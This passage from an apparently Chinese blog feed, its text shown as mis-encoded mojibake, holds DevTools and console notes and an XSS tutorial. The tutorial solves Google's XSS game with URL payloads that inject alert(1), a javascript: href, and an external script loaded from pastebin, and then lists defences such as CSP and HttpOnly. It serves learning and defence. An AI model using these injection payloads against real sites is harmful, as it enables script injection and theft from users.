·çš„ï¼Œ<em>ï¼ˆæ˜Ÿå·ï¼‰æ˜¯linuxä¸­çš„é€šé…ç¬¦ï¼Œä»£è¡¨ä¸€ä¸ªæˆ–ä¸€ä¸ªä»¥ä¸Šçš„æ‰€æœ‰å­—ç¬¦ã€‚linuxçš„éšè—æ–‡ä»¶å’Œéšè—æ–‡ä»¶å¤¹éƒ½æ˜¯ä»¥.ï¼ˆç‚¹å·ï¼‰å¼€å¤´ï¼Œæ‰€ä»¥.</em>åº”è¯¥æ˜¯ä»£è¡¨å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰éšè—ç›®å½•å’Œéšè—æ–‡ä»¶å¤¹ã€‚å¦‚æœæ˜¯./*åˆ™è¡¨ç¤ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ‰€æœ‰ç›®å½•ï¼Œå› ä¸º.ï¼ˆç‚¹å·ï¼‰è¿˜æœ‰ä»£è¡¨å½“å‰ç›®å½•çš„æ„æ€</p><p>https://zhuanlan.zhihu.com/p/96272363ï¼Œæ—¥å¿—åº”è¯¥æ˜¯æœ€åˆå¼€å‘çš„ä¸€éƒ¨åˆ†å…¶æ¬¡ï¼Œç»“æŸè°ƒè¯•ä¸è¦åˆ é™¤æ—¥å¿—</p><p>å†™æ—¥å¿—çš„åœ°æ–¹ï¼š å…³é”®æ–¹æ³•è°ƒç”¨ï¼šæ—¶é—´å’Œè°ƒç”¨å‚æ•° ä¸Šä¸‹æ¸¸å¯¹æ¥å¤„å¯èƒ½å­˜åœ¨å¼‚å¸¸çš„åœ°æ–¹</p><p>å…¶ä»–consoleæ–¹æ³•ï¼š console.count: ç”¨äºè®¡ç®—å‡½æ•°è¢«è°ƒç”¨çš„æ¬¡æ•°console.log.countReset</p><p>console.group: ç”¨äºæŠ˜å  console.groupCollapsed() console.groupEnd</p><p>consoel.time() console.timeEnd()</p><p>console.table()</p><p>console.dir(obj, { depth: })</p><h2 id="chrome-devtools">Chrome Devtools</h2><p>Network: æŸ¥çœ‹ï¼Œè¿‡æ»¤ç½‘ç»œè¯·æ±‚åˆ—è¡¨ï¼ŒæŸ¥çœ‹è¯·æ±‚è¯¦æƒ… æ¨¡æ‹Ÿå¼±ç½‘ç¯å¢ƒæœç´¢headersä»¥åŠresponseå†…å®¹ ä½¿ç”¨requeset block</p><p>Source æŸ¥çœ‹åŠ è½½çš„èµ„æºæ–‡ä»¶ ç¼–è¾‘csså’Œjsï¼Œä¿®æ”¹csså’Œjs snippetsç®¡ç†æ–­ç‚¹è°ƒè¯• é€šè¿‡workspaceå…³è”åˆ°æœ¬åœ°</p><ol type="1"><li><p>å¦‚ä½•è®©sourceé‡Œçš„æ–‡ä»¶æ ‘çœ‹èµ·æ¥æ›´æ¸…æ™°â€”â€”æŸ¥çœ‹author-deployedï¼Œä½†æ˜¯é¡¹ç›®å¿…é¡»æœ‰source-map</p></li><li><p>å¦‚ä½•è®©call stackä¸­ä»…å‡ºç°å…³å¿ƒçš„æ–‡ä»¶ â€”â€”debug ignore liståœ¨å®é™…æ“ä½œé‡Œï¼Œåœ¨stepinçš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœé‡åˆ°äº†ä¸€ä¸ªä¸æƒ³è°ƒè¯•çš„æ–‡ä»¶ç›´æ¥å³å‡»æ–‡ä»¶çš„ä»£ç åŒºåŸŸï¼Œaddignore listï¼Œä¸‹ä¸€æ¬¡step inçš„æ—¶å€™å°±ä¸ä¼šå‡ºç°è¿™ä¸ªæ–‡ä»¶äº†ï¼Œ</p></li></ol><p>å¦‚ä½•æ¢å¤ï¼Ÿ â€”â€”é¡¶çº§settingsï¼Œæ‰¾åˆ°ignore list</p><ol start="3" type="1"><li><p>å¦‚ä½•å¯¹jsçš„ä¿®æ”¹ï¼Œreloadä¹‹åè¿˜å¯ä»¥ç”Ÿæ•ˆâ€”â€”overridesï¼Œé€‰æ‹©æœ¬åœ°ç›®å½•æ·»åŠ åˆ°overridesä¸­ï¼Œ</p></li><li><p>å¦‚ä½•æ‰¾å‡ºå“ªä¸€è¡Œä»£ç å½±å“äº†æˆ‘çš„å…ƒç´  â€”â€”dom change breakponitsæ¯”å¦‚æ‰¾åˆ°å“ªä¸€è¡Œåˆ é™¤äº†æŸä¸ªdomèŠ‚ç‚¹ï¼šå³å‡»æŸä¸ªdomèŠ‚ç‚¹â€”â€”ã€‹break on-ã€‹noderemoval</p></li><li><p>å¦‚ä½•æ‰¾å‡ºå“ªä¸€è¡Œä»£ç å‘èµ·äº†è¯·æ±‚ â€”â€”sourceé¢æ¿æ‰¾åˆ°xhr/fetchbreakpointsï¼Œè¾“å…¥æ‹¦æˆªçš„urlå³å¯</p></li><li><p>å¼‚å¸¸æ–­ç‚¹ï¼šsourceé¢æ¿æ‰¾åˆ°break pointsï¼Œå‹¾é€‰pause oncaught/uncaught points æ•è·çš„oræœªæ•è·çš„</p></li><li><p>äº‹ä»¶æ–­ç‚¹ å…¨å±€äº‹ä»¶ï¼šsourceé¢æ¿æ‰¾åˆ°event listener breakpointsï¼Œé€‰æ‹©ç›¸åº”çš„äº‹ä»¶å³å¯</p></li><li><p>å¦‚ä½•æ‰“æ–­ç‚¹ï¼Œä¸ä¼šä¸­æ–­ï¼Ÿ source é¢æ¿ï¼ŒæŸä¸€è¡Œï¼Œå³å‡»é€‰æ‹©edit breakpoints =ã€‹é€‰æ‹©log pointsï¼Œè¾“å…¥æƒ³æ‰“å°çš„è¯­å¥å³å¯</p></li></ol><p>å­—é¢œè‰²:30-----------37 30:é»‘ 31:çº¢ 32:ç»¿ 33:é»„ 34:è“è‰² 35:ç´«è‰²36:æ·±ç»¿ 37:ç™½è‰²</p><p>å­—èƒŒæ™¯é¢œè‰²èŒƒå›´:40----47 40:é»‘ 41:æ·±çº¢ 42:ç»¿ 43:é»„è‰² 44:è“è‰² 45:ç´«è‰²46:æ·±ç»¿ 47:ç™½è‰²</p><p>å­—ä½“åŠ äº®é¢œè‰²:90------------97 90:é»‘ 91:çº¢ 92:ç»¿ 93:é»„ 94:è“è‰² 95:ç´«è‰²96:æ·±ç»¿ 97:ç™½è‰²</p><p>èƒŒæ™¯åŠ äº®é¢œè‰²èŒƒå›´:100--------------------107 40:é»‘ 41:æ·±çº¢ 42:ç»¿43:é»„è‰² 44:è“è‰² 45:ç´«è‰² 46:æ·±ç»¿ 47:ç™½è‰²</p><p>===============================================ANSIæ§åˆ¶ç çš„è¯´æ˜\33[0m å…³é—­æ‰€æœ‰å±æ€§ \33[1m è®¾ç½®é«˜äº®åº¦ \33[4m ä¸‹åˆ’çº¿ \33[5m é—ªçƒ \33[7måæ˜¾ \33[8m æ¶ˆéš \33[30m -- \33[37m è®¾ç½®å‰æ™¯è‰² \33[40m -- \33[47mè®¾ç½®èƒŒæ™¯è‰² \33[nA å…‰æ ‡ä¸Šç§»nè¡Œ \33[nB å…‰æ ‡ä¸‹ç§»nè¡Œ \33[nC å…‰æ ‡å³ç§»nè¡Œ\33[nD å…‰æ ‡å·¦ç§»nè¡Œ \33[y;xHè®¾ç½®å…‰æ ‡ä½ç½® \33[2J æ¸…å± \33[Kæ¸…é™¤ä»å…‰æ ‡åˆ°è¡Œå°¾çš„å†…å®¹ \33[s ä¿å­˜å…‰æ ‡ä½ç½® \33[u æ¢å¤å…‰æ ‡ä½ç½® \33[?25léšè—å…‰æ ‡ \33[?25h æ˜¾ç¤ºå…‰æ ‡</p><p>1b[2J1b[$;1H $è¡¨ç¤ºè¡Œä½</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€ï¼Œçˆ†ç ´</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXS</title>
    <link href="/emocoder/2023/05/05/xxs/"/>
    <url>/emocoder/2023/05/05/xxs/</url>
    
    <content type="html"><![CDATA[<p>XSS (Cross-sitescripting)ï¼Œå³è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œåº”è¯¥æ˜¯å‰ç«¯åŒå­¦éƒ½åº”è¯¥å¬è¿‡çš„ç½‘ç»œå®‰å…¨ç›¸å…³çš„åè¯ã€‚å®ƒæ˜¯ä¸€ç§å°è¯•æ³¨å…¥æ¶æ„è„šæœ¬ä»£ç åˆ°ç½‘ç«™ä¸Šçš„æ”»å‡»å½¢å¼ã€‚å®ƒå¯ä»¥ä½¿å¾—æ¶æ„ä½¿ç”¨è€…çš„ä»£ç åœ¨å—å½±å“ç”¨æˆ·çš„æµè§ˆå™¨ç«¯æ‰§è¡Œï¼Œå¹¶å¯¹ç”¨æˆ·çš„å½±å“ã€‚åŸæœ¬ç®€ç§°cssï¼Œä¸ºäº†ä¸å‰ç«¯çš„çº§è”æ ·å¼è¡¨(cascader style sheet)åŒºåˆ†ï¼Œæ”¹ç§° xssã€‚</p><h2 id="xss-ç±»å‹">XSS ç±»å‹</h2><p>XSS å¤§è‡´å¯ä»¥åˆ†ä¸º 3 ä¸ªç±»å‹</p><p>åå°„å‹ ï¼ˆReflected XSS Attacksï¼‰ æ­¤ç§ç±»å‹çš„è·¨ç«™ä»£ç å­˜åœ¨äº URLä¸­ï¼Œæ‰€ä»¥é»‘å®¢é€šå¸¸éœ€è¦é€šè¿‡è¯±éª—æˆ–åŠ å¯†å˜å½¢ç­‰æ–¹å¼ï¼Œå°†å­˜åœ¨æ¶æ„ä»£ç çš„é“¾æ¥å‘ç»™ç”¨æˆ·ï¼Œåªæœ‰ç”¨æˆ·ç‚¹å‡»ä»¥åæ‰èƒ½ä½¿å¾—æ”»å‡»æˆåŠŸå®æ–½ã€‚</p><p>å­˜å‚¨å‹ï¼ˆStored XSS Attacksï¼‰ å­˜å‚¨å‹ XSS è„šæœ¬æ”»å‡»æ˜¯æŒ‡ Webåº”ç”¨ç¨‹åºä¼šå°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¿¡æ¯ä¿å­˜åœ¨æœåŠ¡ç«¯çš„æ•°æ®åº“æˆ–å…¶ä»–æ–‡ä»¶å½¢å¼ä¸­ï¼Œç½‘é¡µè¿›è¡Œæ•°æ®æŸ¥è¯¢å±•ç¤ºæ—¶ï¼Œä¼šä»æ•°æ®åº“ä¸­è·å–æ•°æ®å†…å®¹ï¼Œå¹¶å°†æ•°æ®å†…å®¹åœ¨ç½‘é¡µä¸­è¿›è¡Œè¾“å‡ºå±•ç¤ºï¼Œå› æ­¤å­˜å‚¨å‹XSS å…·æœ‰è¾ƒå¼ºçš„ç¨³å®šæ€§ã€‚</p><p>DOM-based å‹ï¼ˆDOM-based XSS Attacksï¼‰ DOM-basedçš„è·¨ç«™è„šæœ¬æ”»å‡»æ˜¯é€šè¿‡ä¿®æ”¹é¡µé¢ DOM èŠ‚ç‚¹æ•°æ®ä¿¡æ¯è€Œå½¢æˆçš„è·¨ç«™è„šæœ¬æ”»å‡»ã€‚</p><p>ä¸ºäº†æ›´åŠ æ·±åˆ‡çš„è¿‘è·ç¦»ä½“éªŒxssï¼Œå¯ä»¥ç™»é™†ä¸‹https://xss-game.appspot.com/level3ï¼Œè¿™ä¸ªæ¸¸æˆæ˜¯ Googleæä¾›çš„ä¸€ä¸ª XSSçš„å°æ¸¸æˆï¼Œå¤§å®¶å¯ä»¥è‡ªå·±åœ¨æµè§ˆå™¨é‡Œè¯•è¯•çœ‹èƒ½ä¸èƒ½é—¯è¿‡æ‰€æœ‰çš„å…³å¡ï¼ˆå¯ä»¥é€šè¿‡ç ”ç©¶Target Code æ¥æ‰¾åˆ°å¯ä»¥æ³¨å…¥ä»£ç çš„åœ°æ–¹ï¼Œå¦‚æœæƒ³ä¸å‡ºæ¥å¯ä»¥çœ‹çœ‹é¡µé¢ä¸Šçš„Hintsï¼‰ã€‚å»ºè®®å°½é‡ä¸è¦çœ‹æç¤ºæ¥æŒ‘æˆ˜ã€‚è¿™ä¸ªæ¸¸æˆä¸€å…±æœ‰ 6å…³ï¼Œæ¯ä¸ªå…³å¡åˆ©ç”¨äº†å„ç§ä¸åŒçš„æŠ€å·§å’Œæ–¹å¼æ¥æ’å…¥æ¶æ„ä»£ç ï¼Œæœ‰äº›æ–¹å¼ç¡®å®éå¸¸å–å·§ã€‚</p><p>level1: é€šè¿‡åœ¨ query é‡Œæ‹¼æ¥ script å…ƒç´ ï¼Œè€Œå‰ç«¯ä»£ç åˆæ˜¯ä¼šå±•ç¤ºè¿™ä¸ªquery çš„ï¼Œæ‰€ä»¥æ²¡æœ‰è¿‡æ»¤çš„è¯ï¼Œå°±ç›´æ¥è¿è¡Œè„šæœ¬äº†ï¼Œç›´æ¥åˆ©ç”¨äº† urlæ’å…¥è„šæœ¬ï¼Œå±äºåå°„å‹</p><p>level2: ç”¨æˆ·æäº¤ blog æˆ–è€…è¯„è®ºï¼Œå‰ç«¯ä¼šå±•ç¤ºè¿™äº›è¯„è®ºæˆ–è€… blogï¼Œè™½ç„¶script å…ƒç´ ä¸ä¼šå±•ç¤ºï¼Œä½†æ˜¯åƒ dom èŠ‚ç‚¹ï¼Œå¦‚ aï¼Œimg å…ƒç´ è¿˜æ˜¯ä¼šå±•ç¤ºçš„ï¼Œåˆ©ç”¨äº†domï¼Œå±äº dom å‹ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºå­˜å‚¨å‹ï¼Œå’Œå­˜å‚¨ç›¸å…³ã€‚</p><p>level3:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">chooseTab</span>(<span class="hljs-params">num</span>) &#123;<br>  <span class="hljs-comment">// Dynamically load the appropriate image.</span><br>  <span class="hljs-keyword">var</span> html = <span class="hljs-string">&quot;Image &quot;</span> + <span class="hljs-built_in">parseInt</span>(num) + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>  html += <span class="hljs-string">&quot;&lt;img src=&#x27;/static/level3/cloud&quot;</span> + num + <span class="hljs-string">&quot;.jpg&#x27; /&gt;&quot;</span>;<br>  $(<span class="hljs-string">&quot;#tabContent&quot;</span>).<span class="hljs-title function_">html</span>(html);<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨äº†åœ¨æµè§ˆå™¨ç›´æ¥è¾“å…¥ url çš„æ¼æ´ï¼Œå‰ç«¯ä»£ç ä¼šç”¨ url é‡Œçš„å‚æ•°ä½œä¸º imgå…ƒç´ çš„å±æ€§ç›´æ¥æ‹¼æ¥ï¼Œç”±äºæ²¡æœ‰å¯¹è¿™äº›å‚æ•°åšè½¬ä¹‰ï¼Œæ‰€ä»¥å¯èƒ½ä¼šå¯¼è‡´æ¶æ„ä»£ç æ’å…¥ï¼Œç”±äºåˆ©ç”¨äº†dom å…ƒç´ ï¼Œå±äº dom å‹</p><p>level4: æœåŠ¡ç«¯æ¨¡æ¿åŒ…å«å¦‚ä¸‹ä»£ç ï¼š<img src="/static/loading.gif" onload="startTimer('');"/&gt;è€Œtimeræ˜¯ä»urlçš„å‚æ•°é‡Œå–çš„ï¼Œå¦‚æœè¿™ä¸ªtimeråŒ…å«äº†å…¶ä»–çš„jsè„šæœ¬ä»£ç ï¼Œå°±ä¼šæœ‰é—®é¢˜ï¼Œå¦‚ä¸‹ï¼šhttps://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvarb=('</p><p>=&gt; startTimer('');alert(1);var b=('');</p><p>level5: å‰ç«¯è„šæœ¬ï¼š <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&#123;&#123; next &#125;&#125;&quot;</span>&gt;</span>Next &gt;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure>å‰ç«¯ç›´æ¥åˆ©ç”¨urlçš„å‚æ•°æ‹¼æ¥æˆäº†aå…ƒç´ çš„hrefå±æ€§ï¼šhttps://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)</p><p>level6: æœåŠ¡ç«¯ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setInnerText</span>(<span class="hljs-params">element, value</span>) &#123;<br>  <span class="hljs-keyword">if</span> (element.<span class="hljs-property">innerText</span>) &#123;<br>    element.<span class="hljs-property">innerText</span> = value;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    element.<span class="hljs-property">textContent</span> = value;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">includeGadget</span>(<span class="hljs-params">url</span>) &#123;<br>  <span class="hljs-keyword">var</span> scriptEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;script&quot;</span>);<br><br>  <span class="hljs-comment">// This will totally prevent us from loading evil URLs!</span><br>  <span class="hljs-keyword">if</span> (url.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/^https?:\/\//</span>)) &#123;<br>    <span class="hljs-title function_">setInnerText</span>(<br>      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;log&quot;</span>),<br>      <span class="hljs-string">&#x27;Sorry, cannot load a URL containing &quot;http&quot;.&#x27;</span><br>    );<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// Load this awesome gadget</span><br>  scriptEl.<span class="hljs-property">src</span> = url;<br><br>  <span class="hljs-comment">// Show log messages</span><br>  scriptEl.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">setInnerText</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;log&quot;</span>), <span class="hljs-string">&quot;Loaded gadget from &quot;</span> + url);<br>  &#125;;<br>  scriptEl.<span class="hljs-property">onerror</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">setInnerText</span>(<br>      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;log&quot;</span>),<br>      <span class="hljs-string">&quot;Couldn&#x27;t load gadget from &quot;</span> + url<br>    );<br>  &#125;;<br><br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">appendChild</span>(scriptEl);<br>&#125;<br><br><span class="hljs-comment">// Take the value after # and use it as the gadget filename.</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getGadgetName</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substr</span>(<span class="hljs-number">1</span>) || <span class="hljs-string">&quot;/static/gadget.js&quot;</span>;<br>&#125;<br><br><span class="hljs-title function_">includeGadget</span>(<span class="hljs-title function_">getGadgetName</span>());<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ¬æ¥æƒ³ç›´æ¥æ’å…¥scriptå…ƒç´ çš„ï¼Œä½†æ˜¯è¡Œä¸é€šï¼Œåªæœ‰é€šè¿‡scriptçš„srcå¤–é“¾åŠ è½½å¤–åŸŸè„šæœ¬ï¼šhtTps://pastebin.com/raw.php?i=15S5qZs0https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0</p><h2 id="æ›´è¿›ä¸€æ­¥åœ°å®éªŒ">æ›´è¿›ä¸€æ­¥åœ°å®éªŒ</h2><p>å› ä¸ºç°åœ¨å¤§éƒ¨åˆ†çš„å‰åç«¯æ¡†æ¶éƒ½ä¼šæœ‰ XSSç›¸å…³çš„å®‰å…¨ç­–ç•¥ï¼Œä¸”é»˜è®¤æ˜¯å¼€å¯çš„ï¼Œå¹³æ—¶æƒ³è¦æµ‹è¯•ä¸€ä¸‹ XSSçš„æ¼æ´å¯èƒ½è¿˜æ¯”è¾ƒéº»çƒ¦ã€‚é’ˆå¯¹è¿™ç§æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨ Damn Vulnerable WebApplicationï¼ˆhttps://github.com/digininja/DVWAï¼‰ï¼Œå®ƒæ˜¯ä¸€ä¸ªä¸»åŠ¨å…³é—­äº†å„ç§å®‰å…¨ç­–ç•¥çš„Web åº”ç”¨ï¼ŒåŒ…æ‹¬äº†å„ç§å„æ ·æ¼æ´ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬ XSSçš„éƒ¨åˆ†ï¼Œå¯ä»¥ç”¨æ¥æµ‹è¯•è‡ªå·±å¯¹è¿™äº›æ¼æ´çš„æŒæ¡ã€‚</p><p>é˜²èŒƒæ‰‹æ®µ é˜²å¾¡ XSSä¸€å¤§åŸåˆ™å°±æ˜¯ä¸è¦ä¿¡ä»»ç”¨æˆ·è¾“å…¥çš„å†…å®¹ï¼æ‰€æœ‰ç”¨æˆ·è¾“å…¥çš„å†…å®¹éƒ½å¯ä»¥é»˜è®¤ä¸ºä¸å¯æ§çš„ã€ä¸å®‰å…¨çš„ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºè¡¨å•è¾“å…¥/URL ç­‰å¯ä»¥ç”±ç”¨æˆ·ä»»æ„è¾“å…¥çš„æ¥æºã€‚åœ¨å›æ˜¾ç”¨æˆ·çš„è¾“å…¥æ—¶å€™ä¸€å®šè¦åšXSS çš„è¿‡æ»¤å’Œç›¸åº”çš„ç¼–ç ã€‚</p><h2 id="æµè§ˆå™¨å†…ç½®çš„å®‰å…¨æœºåˆ¶">æµè§ˆå™¨å†…ç½®çš„å®‰å…¨æœºåˆ¶</h2><p>å¼€å¯ X-XSS-Protectionï¼šé’ˆå¯¹åå°„å‹ XSSçš„ä¸€ç§æµè§ˆå™¨é˜²å¾¡æœºåˆ¶ï¼Œç°åœ¨å¤§éƒ¨åˆ†ç°ä»£æµè§ˆå™¨å·²ç»åºŸå¼ƒäº†è¿™ä¸ªå±æ€§ã€‚</p><p>å†…å®¹å®‰å…¨ç­–ç•¥ CSPï¼šCSPé€šè¿‡æŒ‡å®šæœ‰æ•ˆåŸŸâ€”â€”å³æµè§ˆå™¨è®¤å¯çš„å¯æ‰§è¡Œè„šæœ¬çš„æœ‰æ•ˆæ¥æºâ€”â€”ä½¿æœåŠ¡å™¨ç®¡ç†è€…æœ‰èƒ½åŠ›å‡å°‘æˆ–æ¶ˆé™¤XSS æ”»å‡»æ‰€ä¾èµ–çš„è½½ä½“ã€‚ä¸€ä¸ª CSPå…¼å®¹çš„æµè§ˆå™¨å°†ä¼šä»…æ‰§è¡Œä»ç™½åå•åŸŸè·å–åˆ°çš„è„šæœ¬æ–‡ä»¶ï¼Œå¿½ç•¥æ‰€æœ‰çš„å…¶ä»–è„šæœ¬(åŒ…æ‹¬å†…è”è„šæœ¬å’Œ HTML çš„äº‹ä»¶å¤„ç†å±æ€§) æµè§ˆå™¨çš„åŒæºç­–ç•¥ã€‚</p><p>Cookie å®‰å…¨ï¼šè®¾ç½® Cookie çš„ HttpOnly å±æ€§ï¼Œèƒ½å¤Ÿæœ€å¤§é™åº¦çš„ä¿è¯ä½ çš„Cookie ä¸ä¼šè¢«è„šæœ¬æ‰€è¯»å–å¹¶å‘é€åˆ°å…¶ä»–æœåŠ¡å™¨ä¸Šã€‚</p><h2 id="ä½¿ç”¨æˆç†Ÿçš„æ¡†æ¶å®‰å…¨æœºåˆ¶">ä½¿ç”¨æˆç†Ÿçš„æ¡†æ¶å®‰å…¨æœºåˆ¶</h2><p>å¯¹äºå‰ç«¯æ¥è¯´ï¼Œä½¿ç”¨å¸¸ç”¨çš„åº“ï¼ŒReact/Vue/Angularç­‰æµè¡Œæ¡†æ¶æ¥æ¸²æŸ“æ•°æ®åŸºæœ¬ä¸Šéƒ½ä¸ä¼šæœ‰å¤ªå¤§çš„é—®é¢˜ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¿…é¡»éå¸¸éå¸¸éå¸¸æ…é‡ä½¿ç”¨ç±»ä¼¼React çš„ dangerouslySetInnerHTML æˆ–è€… Vue çš„ v-html è¿™ç±»ç»•è¿‡ XSSè¿‡æ»¤èƒ½åŠ›çš„å±æ€§ã€‚</p><p>ä¸å°‘åç«¯æœåŠ¡çš„æ¡†æ¶ä¹Ÿéƒ½åœ¨è®¾è®¡æ—¶å°±è€ƒè™‘äº† XSS çš„å®‰å…¨é—®é¢˜ï¼Œå¦‚ Ruby onRailsã€‚å½“ç„¶è¿™ç±»é˜²å¾¡æªæ–½è¿˜æ˜¯æœ‰å…¶å±€é™æ€§çš„ï¼Œå¹¶ä¸æ˜¯èƒ½ä¸€åŠ³æ°¸é€¸çš„è§£å†³æ‰€æœ‰æ”»å‡»å¨èƒçš„ã€‚</p><h2id="åœ¨æ²¡æœ‰æ¡†æ¶å®‰å…¨æœºåˆ¶ä¿è¯ä¸‹éœ€è¦é¿å…çš„æ“ä½œ">åœ¨æ²¡æœ‰æ¡†æ¶å®‰å…¨æœºåˆ¶ä¿è¯ä¸‹éœ€è¦é¿å…çš„æ“ä½œ</h2><p>å¯¹äºå‰ç«¯æ¥è¯´ï¼Œä¸»è¦éœ€è¦é’ˆå¯¹å¤„ç†çš„æ˜¯ DOM-based çš„ XSS å¨èƒã€‚</p><p>åœ¨ä½¿ç”¨ Vanilla JavaScript éœ€è¦é¿å…é‚£äº›èƒ½å¤Ÿç›´æ¥ä¿®æ”¹ HTML çš„æ“ä½œï¼Œå¦‚innerHTML/outerHTML å±æ€§æˆ–è€… document.writeä¹‹ç±»çš„æ–¹æ³•ã€‚å½“éœ€è¦å±•ç¤ºæ–‡æœ¬çš„æ—¶å€™ï¼Œé€‰æ‹©å¦‚ textContent/innerTextä¹‹ç±»å®‰å…¨çš„æ–¹æ³•ã€‚å½“éœ€è¦åˆ›å»º HTML æ ‡ç­¾çš„æ—¶å€™ï¼Œé€‰æ‹©createElement/appendChild ä¹‹ç±»çš„æ–¹æ³•ã€‚</p><p>è¿˜æœ‰å°±æ˜¯æ›´åŠ å±é™©çš„ evalæ–¹æ³•ï¼Œè™½ç„¶ä¸€èˆ¬ä¸ä¼šä½¿ç”¨ï¼Œä½†æ˜¯éœ€è¦é¿å…ä¸€äº›éšå¼çš„ eval ä½¿ç”¨ï¼Œæ¯”å¦‚setTimeout/setInterval å°±å¯ä»¥é€šè¿‡ setTimeout(codeAsString, delay)çš„å½¢å¼æ‰§è¡Œä»»æ„å­—ç¬¦ä¸²ä»£ç ã€‚</p><p>é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ HTML æ ‡ç­¾ä¸Šçš„ä¸€äº›äº‹ä»¶å±æ€§ç­‰ç­‰ã€‚</p><p>å¦‚æœæ— å¯é¿å…çš„è¦ä½¿ç”¨ç±»ä¼¼æ–¹æ³•ï¼Œä¸€å®šåœ¨æ¸²æŸ“å‰åšå¥½è¿‡æ»¤å’Œç¼–ç å·¥ä½œã€‚</p><h2 id="æ›´åŠ ç»†è‡´çš„é˜²èŒƒ-cheatsheet">æ›´åŠ ç»†è‡´çš„é˜²èŒƒ CheatSheet</h2><p>å¼€æ”¾å¼ Web åº”ç”¨ç¨‹åºå®‰å…¨é¡¹ç›® ï¼ˆ OWASPï¼‰æä¾›äº†é’ˆå¯¹ XSS é˜²å¾¡çš„è¯¦å°½CheatSheetï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥ä½œä¸ºå‚è€ƒã€‚</p><p>https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.htm</p><p>https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html</p><h2 id="å®‰å…¨æ£€æµ‹">å®‰å…¨æ£€æµ‹</h2><p>ä¸€äº›å·¥å…·å¯ä»¥æ‰«æç½‘ç«™å­˜åœ¨çš„ XSS æ¼æ´ï¼Œå¯ä»¥æ–¹ä¾¿æŸ¥ç¼ºè¡¥æ¼</p><p>https://github.com/s0md3v/XSStrike</p><p>https://www.zaproxy.org/</p><h2 